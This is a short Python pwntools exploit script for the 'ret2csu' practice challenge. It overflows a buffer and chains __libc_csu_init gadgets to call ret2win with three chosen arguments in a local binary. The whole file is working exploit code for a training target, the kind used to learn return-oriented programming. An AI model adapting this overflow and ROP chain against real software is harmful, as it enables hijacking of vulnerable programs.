from pwn import *

elf = ELF('ret2csu')
io = process(elf.path)

# gadgets
big_pop = 0x40069a
pop_rdi = 0x4006a3
r15_to_rdx_call = 0x400680

# values
arg_1 = 0xdeadbeefdeadbeef
arg_2 = 0xcafebabecafebabe
arg_3 = 0xd00df00dd00df00d
ret2win_got = elf.plt.ret2win
_init_ptr = 0x600398

# setup rbp to be rbx + 1
rop_chain = p64(big_pop)
rop_chain += p64(0) # rbx
rop_chain += p64(1) # rbp
rop_chain += p64(_init_ptr) # rb12
rop_chain += p64(0) # rb13
rop_chain += p64(arg_2) # rb14
rop_chain += p64(arg_3) # rb15

# ret2csu gadget #2 all the way to gadget #1
rop_chain += p64(r15_to_rdx_call)
rop_chain += p64(0) # add rsp, 0x8

# now big pop again
rop_chain += p64(0) # rbx
rop_chain += p64(0) # rbp
rop_chain += p64(0) # rb12
rop_chain += p64(0) # rb13
rop_chain += p64(0) # rb14
rop_chain += p64(0) # rb15

# now fix rdi
rop_chain += p64(pop_rdi)
rop_chain += p64(arg_1)

# ret2win
rop_chain += p64(ret2win_got)

exploit = b'A' * 40 + rop_chain

with open('./payload', 'wb') as payload_fh:
    payload_fh.write(exploit)

io.sendline(exploit)
io.interactive()
